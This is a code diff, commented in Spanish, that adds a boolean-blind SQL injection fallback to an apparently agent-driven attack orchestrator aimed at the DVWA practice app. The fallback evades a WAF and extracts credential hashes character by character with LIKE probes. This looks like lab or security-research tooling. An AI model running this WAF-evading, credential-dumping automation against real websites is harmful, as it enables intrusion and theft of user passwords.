@@ -14,6 +14,7 @@ import time
 from typing import Callable, Optional
 
 from .agents import Analyst, Executor, Planner
+from .blind import BlindExtractor
 from .discovery import ProbeResult, SchemaDiscovery, pick_credential_columns
 from .dvwa import DVWAClient
 from .evasion import EvasionEngine
@@ -111,6 +112,13 @@ class Orchestrator:
                 say(f"[Orchestrator] SUCCESS — {len(extracted)} credenciales extraídas "
                     f"(DBMS={res.dbms or '?'}, confirmada por {res.techniques}, extracción {conf})")
         if not success:
+            # Fallback boolean-blind: si UNION está bloqueado pero el booleano pasa (p. ej. NAXSI
+            # bloquea UNION/SELECT pero deja LIKE), extrae carácter por carácter con LIKE.
+            blind = self._blind_fallback(engine, level, deadline, counter, say)
+            if blind:
+                extracted, success = [blind], True
+                res.trace.append(f"extracción boolean-blind (LIKE): {blind}")
+        if not success:
             say("[Orchestrator] FAILED — no se extrajeron credenciales")
 
         elapsed = time.monotonic() - start
@@ -124,3 +132,32 @@ class Orchestrator:
             trace=res.trace,
             waf_profile=engine.profile.summary(),
         )
+
+    def _blind_fallback(self, engine, level, deadline, counter, say):
+        """Extracción boolean-blind con LIKE cuando UNION está bloqueado pero el booleano pasa."""
+        def oracle(payload: str) -> bool:
+            while time.monotonic() < deadline:
+                p, pipe = engine.next_payload(payload)
+                if p is None:
+                    return False
+                counter["steps"] += 1
+                resp = self.dvwa.run_sqli(p, level)
+                if resp.blocked:
+                    engine.record(pipe, p, blocked=True)
+                    continue
+                engine.record(pipe, p, blocked=False)
+                return bool(resp.rows)
+            return False
+
+        for quote in ("", "'"):   # medium = entero (sin comilla); otros = cadena
+            bx = BlindExtractor(oracle, quote=quote, say=say)
+            if not bx.confirm():
+                continue
+            say(f"[Blind] inyección booleana confirmada (comillas={quote!r}); "
+                f"UNION bloqueado → extracción ciega con LIKE")
+            row = bx.dump_first_row()
+            if row and row.get("hash"):
+                say(f"[Orchestrator] SUCCESS (boolean-blind, {bx.requests} sondeos) — {row}")
+                return row
+            return None
+        return None
